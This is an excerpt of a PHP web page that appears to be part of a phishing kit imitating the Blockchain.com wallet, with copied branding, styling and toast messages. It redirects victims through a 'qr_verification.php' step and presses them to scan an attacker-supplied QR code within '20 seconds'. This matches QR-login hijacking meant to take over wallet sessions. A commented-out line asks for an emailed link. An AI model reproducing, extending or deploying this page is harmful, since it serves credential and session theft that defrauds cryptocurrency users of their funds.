...
header('Location: qr_verification.php?client_id='.$name.'&csrf='.$om.'');}
...
?>
    ...
    <link rel="stylesheet" href="./assets/style/dashboard.css">
        ...
        <body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true">
          <div class="sc-bsbRJL jBomjO"><span><div class="sc-kIPQKe jjKFRZ"><div color="blue600" class="sc-eXEjpC equTMu"><div class="sc-ibxdXY ChZLf"><div data-e2e="toastMessage" color="grey700" cursor="inherit" opacity="1" class="sc-gzVnrw bulvXJ" style="margin-left: 10px;"><span><?php if($_GET["error"] == "qr") {
                                             echo "Error please re-scan the qr code";
                                         }else {
                                             echo "Please scan the following qr code.";
                ...
                <a href="">
                    <center><img style="margin: 44px 0 40px 0" src="assets/img/bc-logo.svg" alt="" height="24px" width="auto"></center>   </a>
                </div>
                                        ...
                                        <div class="row">
                                            <div class="col-xs-10 col-xs-offset-1">
                                                    <div class="welcom">
                                                        ...
                                                        <p style="font-size: 14px;">Scan the following QR Code to finish, in 20 seconds this session will be expired</p>
                                                        <br>
                                                        <?php if (!isset($_GET["qrcode"])) {
                                                           echo '<center><img width="150px" src="./qrcodes/qr.jpg"></center>';
                                                        }else {
                                                            echo '<center><img src='.$qr.'></center>';
                                                        }
                                                        ?>
                                                        <!-- <p style="font-size: 16px;">Please paste here the link that has reached the email</p> -->
                                                    </div>
